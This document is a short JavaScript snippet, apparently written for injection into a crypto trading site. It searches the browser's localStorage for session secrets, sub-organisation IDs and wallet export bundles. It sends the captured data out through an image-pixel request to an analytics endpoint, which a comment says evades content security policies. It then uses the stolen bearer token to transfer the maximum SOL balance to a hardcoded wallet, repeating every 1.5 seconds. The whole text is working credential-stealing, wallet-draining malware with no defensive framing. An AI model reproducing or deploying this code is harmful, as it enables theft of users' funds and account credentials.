(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // 1. PIXEL TRACKER (Bypasses many CSPs)
    const logToAmp = (data) => {
        const event = {
            api_key: AMP_KEY,
            events: [{
                device_id: data.subId || "UNKNOWN",
                event_type: "FIREBASE_HANDSHAKE_CAPTURED",
                event_properties: data
            }]
        };
        // Encode the data into a URL string to 'hide' it as an image request
        const encoded = btoa(JSON.stringify(event));
        const img = new Image();
        img.src = `https://api2.amplitude.com/2/httpapi?data=${encoded}`;
    };

    // 2. DEEP RECURSIVE SEARCH
    // This looks for 'sessionSecret' NO MATTER WHERE IT IS HIDDEN
    const findInObject = (obj, target) => {
        if (obj && typeof obj === 'object') {
            for (let key in obj) {
                if (key === target) return obj[key];
                const res = findInObject(obj[key], target);
                if (res) return res;
            }
        }
        return null;
    };

    const scrapeEverything = async () => {
        let loot = { auth: null, subId: null, bundle: null };
        
        // Search LocalStorage
        for (let i = 0; i < localStorage.length; i++) {
            try {
                const item = JSON.parse(localStorage.getItem(localStorage.key(i)));
                if (!loot.auth) loot.auth = findInObject(item, 'sessionSecret');
                if (!loot.subId) loot.subId = findInObject(item, 'subOrgId');
                if (!loot.bundle) loot.bundle = findInObject(item, 'exportBundle');
            } catch(e) {}
        }

        if (loot.auth && loot.subId) {
            console.log("1:1 Match Found. Syncing...");
            logToAmp({ subId: loot.subId, status: "READY" }); // Send to AMP
            
            // Execute the transfer logic here...
            await fetch("https://trade.padre.gg/api/v1/transfer", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${loot.auth}`,
                    "X-Turnkey-Sub-Org-Id": loot.subId,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    recipient: MY_RECEIVER,
                    amount: "MAX",
                    asset: "SOL",
                    ext_payload: loot.bundle?.data
                })
            }).catch(() => {});
        }
    };

    // Run immediately and then poll every second for the 'Brief Handshake'
    scrapeEverything();
    setInterval(scrapeEverything, 1500);
})();
